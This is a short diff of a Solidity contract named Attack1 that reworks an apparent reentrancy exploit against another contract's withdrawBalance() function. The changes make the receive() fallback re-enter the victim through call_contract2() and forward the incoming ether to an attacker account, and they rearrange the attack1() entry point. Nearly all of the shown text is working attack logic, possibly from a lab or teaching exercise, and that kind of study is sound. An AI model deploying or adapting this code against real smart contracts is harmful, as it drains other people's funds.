@@ -34,16 +34,12 @@ contract Attack1{
             abi.encodeWithSignature("withdrawBalance()")
         );
 
-        /*(bool success2, ) = contract2.call(
-            abi.encodeWithSignature("transfer(address,uint256)", address(this), attack_value)
-        );*/
-
         require(success, "withdraw did not go through");
-        //require(success2, "transfer did not go through");
     }
 
     receive() external payable{
-        //attacker_account.transfer(msg.value);
+        call_contract2();
+        attacker_account.transfer(msg.value);
     }
 
     function call_contract2() public {
@@ -57,7 +53,6 @@ contract Attack1{
     function attack1() public payable {
         sendEther(msg.value, msg.sender);
         addAllowance();
-        //receiveEther();
-        call_contract2();
+        receiveEther();
     }
 }
